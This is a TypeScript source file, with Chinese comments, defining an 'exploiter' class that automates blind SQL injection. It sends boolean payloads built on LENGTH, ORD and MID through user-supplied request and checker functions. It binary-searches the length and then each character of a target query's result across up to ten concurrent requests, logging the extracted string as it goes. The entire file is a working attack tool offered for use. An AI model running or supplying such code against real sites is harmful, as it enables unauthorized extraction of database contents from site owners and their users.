export default class exploiter {
  protected max_threads: number;
  protected _if: (payload: string) => Promise<boolean>;
  protected _build: (payload: string) => string;
  protected _log = console.log;
  protected _patterns;

  /**
   * 创建一个 SQL 盲注利用器实例
   * @param options - 配置选项
   * @param options.checker - 检查 payload 是否为真的函数,返回 Promise<boolean>
   * @param options.builder - 构建完整 payload 的函数,接收注入语句并返回完整请求
   * @param options.max_threads - 最大并发线程数,默认为 10
   * @param options.patterns - 自定义 SQL 注入模式
   * @param options.patterns.lengthGT - 长度比较模式,默认使用 LENGTH 函数
   * @param options.patterns.bitGT - 字符比较模式,默认使用 ORD 和 MID 函数，默认实现如下：
   * ```typescript
   *  {
   *    lengthGT: (a: unknown, b: unknown) => `LENGTH((${a}))>${b}`,
   *    bitGT: (target: unknown, bit: unknown, mid: number) => `ORD(MID((${target}),${bit},1))>'${mid}'`,
   *  }
   * ```
   */
  constructor({
    checker,
    builder,
    max_threads,
    patterns,
  }: {
    checker: (payload: string) => Promise<boolean>;
    builder: (payload: string) => string;
    max_threads?: number;
    patterns?: {
      lengthGT?: (a: unknown, b: unknown) => string;
      bitGT?: (target: unknown, bit: unknown, mid: number) => string
    };
  }) {
    this._if = checker;
    this._build = builder;
    this.max_threads = max_threads ?? 10;
    this._patterns = Object.assign(
      {
        lengthGT: (a: unknown, b: unknown) => `LENGTH((${a}))>${b}`,
        bitGT: (target: unknown, bit: unknown, mid: number) =>
          `ORD(MID((${target}),${bit},1))>'${mid}'`,
      },
      patterns ?? {},
    );
  }

  private async _bruteBit(target: string, bit: number) {
    let left = 32;
    let right = 127;
    let mid: number;
    while (left < right) {
      mid = Math.floor((left + right) / 2);
      if (await this._if(this._build(this._patterns.bitGT(target, bit, mid))))
        left = mid + 1;
      else right = mid;
    }
    return String.fromCharCode(left);
  }

  private async _bruteLength(target: string) {
    let right = 10;
    while (true) {
      if (await this._if(this._build(this._patterns.lengthGT(target, right))))
        right *= 10;
      else break;
    }
    let left = 0;
    let mid: number;
    while (left < right) {
      mid = Math.floor((left + right) / 2);
      if (await this._if(this._build(this._patterns.lengthGT(target, mid))))
        left = mid + 1;
      else right = mid;
    }
    return left;
  }

  async runSqli(target: string) {
    this._log(`[*] 开始对目标 ${target} 进行 SQL 注入盲注...`);
    this._log("[*] 正在爆破长度...");
    const length = await this._bruteLength(target);
    this._log(`[+] 爆破长度完成，长度为 ${length}`);
    const res: string[] = new Array(length).fill("?");
    const pending = Array.from({ length }, (_, i) => i + 1); // range [1, length]
    const pool: Promise<string>[] = [];
    function _wrap(
      bit: number,
      brute: (target: string, bit: number) => Promise<string>,
      _log = console.log,
    ) {
      return new Promise<string>((resolve) => {
        brute(target, bit).then((b) => {
          res[bit - 1] = b;
          const _next = pending.shift();
          if (_next !== undefined) {
            pool.push(_wrap(_next, brute, _log));
          }
          _log(`[+] 已完成爆破 ${bit}/${length} 位，当前结果：${res.join("")}`);
          resolve(b);
        });
      });
    }
    for (let i = 0; i < this.max_threads; i++) {
      const bit = pending.shift();
      if (bit === undefined) break;
      pool.push(_wrap(bit, this._bruteBit.bind(this)));
    }
  }
}
